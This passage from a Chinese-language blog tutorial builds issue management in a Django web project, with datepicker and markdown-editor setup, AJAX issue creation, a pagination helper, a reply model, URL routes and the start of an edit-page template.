class="line"><span class="actionscript">        <span class="comment">/* 开始时间，与结束时间*/</span></span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">initDatePicker</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            $(<span class="string">'#id_start_date,#id_end_date'</span>).datepicker(&#123;</span></span><br><span class="line"><span class="actionscript">                format: <span class="string">'yyyy-mm-dd'</span>,</span></span><br><span class="line"><span class="actionscript">                startData: <span class="string">'0'</span>,</span></span><br><span class="line"><span class="actionscript">                language: <span class="string">"zh-CN"</span>,</span></span><br><span class="line"><span class="actionscript">                autoclose: <span class="literal">true</span>,</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">bindBootStrapShownEvent</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            $(<span class="string">'#addModal'</span>).on(<span class="string">'shown.bs.modal'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 对话框弹出时，内容触发</span></span></span><br><span class="line">                initEditorMd();</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">         初始化markdown编辑器(textare转为编辑器）</span><br><span class="line">         */</span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">initEditorMd</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            editormd(<span class="string">'editor'</span>, &#123;</span></span><br><span class="line"><span class="actionscript">                placeholder: <span class="string">"请输入内容"</span>,</span></span><br><span class="line">                height: 300,</span><br><span class="line"><span class="actionscript">                path: <span class="string">"&#123;% static 'plugin/editor-md/lib/' %&#125;"</span>,</span></span><br><span class="line"><span class="actionscript">                imageUpload: <span class="literal">true</span>,</span></span><br><span class="line"><span class="actionscript">                imageFormats: [<span class="string">"jpg"</span>, <span class="string">"jpeg"</span>, <span class="string">"png"</span>, <span class="string">"gif"</span>],</span></span><br><span class="line">                imageUploadURL: WIKI_UPLOAD_URL,</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">       <span class="comment">// 新建问题</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="12-4-新建问题"><a href="#12-4-新建问题" class="headerlink" title="12.4 新建问题"></a>12.4 新建问题</h3><ul><li>给新建问题的按钮绑定事件</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 新建问题</span></span><br><span class="line"><span class="keyword">var</span> POST_ISSUES = <span class="string">"&#123;% url 'issues' project_id=request.tracer.project.id%&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bindAddSubmit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">'#btnAddSubmit'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="string">'#addForm'</span>).find(<span class="string">'.error-msg'</span>).empty();</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url: POST_ISSUES,</span><br><span class="line">            type: <span class="string">"POST"</span>,</span><br><span class="line">            data: $(<span class="string">'#addForm'</span>).serialize(),</span><br><span class="line">            dataType: <span class="string">"JSON"</span>,</span><br><span class="line">            success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (res.status) &#123;</span><br><span class="line">                    location.href = location.href;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $.each(res.error, <span class="function"><span class="keyword">function</span> (<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">                        $(<span class="string">'#id_'</span> + key).parent().next(<span class="string">'.error-msg'</span>).text(value[<span class="number">0</span>])</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>后端处理</p><p>问题管理页面与新建问题用的是同一个视图函数。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">issues</span><span class="params">(request, project_id)</span>:</span></span><br><span class="line">    <span class="string">""" 问题列表 """</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"GET"</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">'manage/issues.html'</span>, context)</span><br><span class="line">    </span><br><span class="line">   form = IssuesModelForm(request, data=request.POST)</span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        <span class="comment"># 添加问题</span></span><br><span class="line">        form.instance.project = request.tracer.project</span><br><span class="line">        form.instance.creator = request.tracer.user</span><br><span class="line">        form.save()</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'error'</span>: form.errors&#125;)</span><br></pre></td></tr></table></figure><h3 id="12-5-分页"><a href="#12-5-分页" class="headerlink" title="12.5 分页"></a>12.5 分页</h3><p>在utils文件下创建pangination.py文件，用于存放分页的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pagination</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,request,data_length,per_num=<span class="number">10</span>,max_show=<span class="number">11</span>)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            page = int(request.GET.get(<span class="string">'page'</span>, <span class="string">'1'</span>))</span><br><span class="line">            <span class="keyword">if</span> page &lt;= <span class="number">0</span>:</span><br><span class="line">                page = <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            page = <span class="number">1</span></span><br><span class="line">        <span class="comment"># print(page,type(page))</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 每页显示的数据条数 per_num = 10</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># request.GET.copy()返回一个可编辑的深拷贝</span></span><br><span class="line">        qd = request.GET.copy()</span><br><span class="line">        <span class="comment"># 对url进行编辑</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 总页码数</span></span><br><span class="line">        total_num, more = divmod(data_length, per_num)</span><br><span class="line">        <span class="keyword">if</span> more:</span><br><span class="line">            total_num += <span class="number">1</span></span><br><span class="line">        <span class="comment"># print(total_num)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> page &gt; total_num:</span><br><span class="line">            page = total_num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 要显示的页码数</span></span><br><span class="line">        <span class="comment"># max_show = 11</span></span><br><span class="line">        half_show = max_show // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> total_num &lt;= max_show:</span><br><span class="line">            <span class="comment"># 页码的起始值</span></span><br><span class="line">            page_start = <span class="number">1</span></span><br><span class="line">            <span class="comment"># 页码的终止值</span></span><br><span class="line">            page_end = total_num</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 处理左边极值</span></span><br><span class="line">            <span class="keyword">if</span> page - half_show &lt;= <span class="number">0</span>:</span><br><span class="line">                page_start = <span class="number">1</span></span><br><span class="line">                page_end = max_show</span><br><span class="line">            <span class="keyword">elif</span> page + half_show &gt;= total_num:</span><br><span class="line">                page_start = total_num - max_show + <span class="number">1</span></span><br><span class="line">                page_end = total_num</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                page_start = page - half_show</span><br><span class="line">                page_end = page + half_show</span><br><span class="line"></span><br><span class="line">        page_list = [<span class="string">'&lt;nav aria-label="Page navigation"&gt;&lt;ul class="pagination"&gt;'</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> page == <span class="number">1</span>:</span><br><span class="line">            page_list.append(<span class="string">'&lt;li class="disabled"&gt;&lt;a&gt;&lt;span aria-hidden="true"&gt;上一页&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;'</span>)    <span class="comment"># disabled不能点击</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            qd[<span class="string">'page'</span>] = page<span class="number">-1</span></span><br><span class="line">            page_list.append(<span class="string">'&lt;li&gt;&lt;a href="?&#123;&#125;"&gt;&lt;span aria-hidden="true"&gt;上一页&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;'</span>.format(qd.urlencode()))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(page_start, page_end + <span class="number">1</span>):</span><br><span class="line">            qd[<span class="string">'page'</span>] = i</span><br><span class="line">            <span class="keyword">if</span> i == page:</span><br><span class="line">                page_list.append(<span class="string">'&lt;li class="active"&gt;&lt;a href="?&#123;&#125;"&gt;&#123;&#125;&lt;/a&gt;&lt;/li&gt;'</span>.format(qd.urlencode(), i))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                page_list.append(<span class="string">'&lt;li&gt;&lt;a href="?&#123;&#125;"&gt;&#123;&#125;&lt;/a&gt;&lt;/li&gt;'</span>.format(qd.urlencode(), i))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> page == total_num:</span><br><span class="line">            page_list.append(<span class="string">'&lt;li class="disabled"&gt;&lt;a&gt;&lt;span aria-hidden="true"&gt;下一页&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            qd[<span class="string">'page'</span>] = page+<span class="number">1</span></span><br><span class="line">            page_list.append(<span class="string">'&lt;li&gt;&lt;a href="?&#123;&#125;"&gt;&lt;span aria-hidden="true"&gt;下一页&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;'</span>.format(qd.urlencode()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        page_list.append(<span class="string">'&lt;li class="disabled"&gt;&lt;a&gt;共%s条数据,页码%s/%s页&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/nav&gt;'</span>%(data_length,page,total_num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.page_html = <span class="string">''</span>.join(page_list)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 切片的起始值</span></span><br><span class="line"></span><br><span class="line">        self.start = (page - <span class="number">1</span>) * per_num</span><br><span class="line">        <span class="keyword">if</span> self.start &lt; <span class="number">0</span> :</span><br><span class="line">            self.start = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 切片的终止值</span></span><br><span class="line">        self.end = page * per_num</span><br></pre></td></tr></table></figure><ul><li><p><strong>视图函数引入分页</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> utils.pangination <span class="keyword">import</span> Pagination</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">issues</span><span class="params">(request, project_id)</span>:</span></span><br><span class="line">    <span class="string">""" 问题列表 """</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"GET"</span>:</span><br><span class="line">        ....</span><br><span class="line">        <span class="comment"># 分页获取数据</span></span><br><span class="line">        queryset = models.Issues.objects.filter(project_id=project_id).filter(**condition)</span><br><span class="line">        page = Pagination(request, queryset.count(), per_num=<span class="number">5</span>)</span><br><span class="line">        </span><br><span class="line">        form = IssuesModelForm(request)</span><br><span class="line">        ...</span><br><span class="line">        context = &#123;</span><br><span class="line">            <span class="string">'form'</span>: form,</span><br><span class="line">....</span><br><span class="line">            <span class="string">'page_html'</span>: page.page_html,</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">'manage/issues.html'</span>, context</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># post请求</span></span><br><span class="line">    ....</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><strong>前端代码</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 分页的相关代码  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">aria-label</span>=<span class="string">"Page navigation"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"pagination"</span> <span class="attr">style</span>=<span class="string">"margin-top: 0"</span>&gt;</span></span><br><span class="line">        &#123;&#123; page_html|safe &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="12-6-编辑问题"><a href="#12-6-编辑问题" class="headerlink" title="12.6  编辑问题"></a>12.6  编辑问题</h3><h4 id="12-6-1-编辑问题表结构设置"><a href="#12-6-1-编辑问题表结构设置" class="headerlink" title="12.6.1 编辑问题表结构设置"></a>12.6.1 编辑问题表结构设置</h4><table><thead><tr><th>ID</th><th>内容</th><th>类型</th><th>评论者</th><th>时间</th><th>FK自己</th><th>FK问题</th></tr></thead><tbody><tr><td></td><td></td><td>回复</td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>修改记录</td><td></td><td></td><td></td><td></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IssuesReplay</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    <span class="string">"""问题回复"""</span></span><br><span class="line">    replay_type_choices = ((<span class="number">1</span>,<span class="string">'修改记录'</span>),(<span class="number">2</span>,<span class="string">'回复'</span>))</span><br><span class="line">    replay_type = models.IntegerField(verbose_name=<span class="string">'类型'</span>,choices=replay_type_choices)</span><br><span class="line"></span><br><span class="line">    issues = models.ForeignKey(verbose_name=<span class="string">'问题'</span>,to=<span class="string">'Issues'</span>)</span><br><span class="line">    content = models.TextField(verbose_name=<span class="string">'描述'</span>)</span><br><span class="line">    creator = models.ForeignKey(verbose_name=<span class="string">'创建者'</span>,to=<span class="string">'UserInfo'</span>,related_name=<span class="string">'create_reply'</span>)</span><br><span class="line">    create_datetime = models.DateTimeField(verbose_name=<span class="string">'创建时间'</span>,auto_now_add=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    reply = models.ForeignKey(verbose_name=<span class="string">'回复'</span>,to=<span class="string">'self'</span>,null=<span class="literal">True</span>,blank=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h4 id="12-6-2-构造编辑页面的url地址"><a href="#12-6-2-构造编辑页面的url地址" class="headerlink" title="12.6.2 构造编辑页面的url地址"></a>12.6.2 构造编辑页面的url地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    <span class="comment"># 问题管理</span></span><br><span class="line">...</span><br><span class="line">    <span class="comment"># 编辑问题</span></span><br><span class="line">    url(<span class="string">r'^issues/detail/(?P&lt;issues_id&gt;\d+)/$'</span>, issues.issues_detail, name=<span class="string">'issues_detail'</span>),</span><br><span class="line">    <span class="comment"># 问题更新</span></span><br><span class="line">    url(<span class="string">r'^issues/change/(?P&lt;issues_id&gt;\d+)/$'</span>, issues.issues_change, name=<span class="string">'issues_change'</span>),</span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure><h4 id="12-6-3-编辑问题的视图函数"><a href="#12-6-3-编辑问题的视图函数" class="headerlink" title="12.6.3 编辑问题的视图函数"></a>12.6.3 编辑问题的视图函数</h4><p>编辑问题与新建页面的基本一样，所以用同一个form表单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">issues_detail</span><span class="params">(request, project_id, issues_id)</span>:</span></span><br><span class="line">    <span class="string">""" 编辑问题 """</span></span><br><span class="line">    issues_obj = models.Issues.objects.filter(id=issues_id, project_id=project_id).first()</span><br><span class="line">    form = IssuesModelForm(request, instance=issues_obj)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">"manage/issues_detail.html"</span>, &#123;<span class="string">'form'</span>: form, <span class="string">'issues_obj'</span>: issues_obj&#125;)</span><br></pre></td></tr></table></figure><h4 id="12-6-4-编辑问题前端代码"><a href="#12-6-4-编辑问题前端代码" class="headerlink" title="12.6.4 编辑问题前端代码"></a>12.6.4 编辑问题前端代码</h4><p>在manage文件夹下创建issues_detail.html文件存放编辑问题的代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'layout/manage.html' %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% load static %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% block css %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'plugin/editor-md/css/editormd.min.css' %&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'plugin/bootstrap-datepicker/css/bootstrap-datepicker.min.css' %&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span 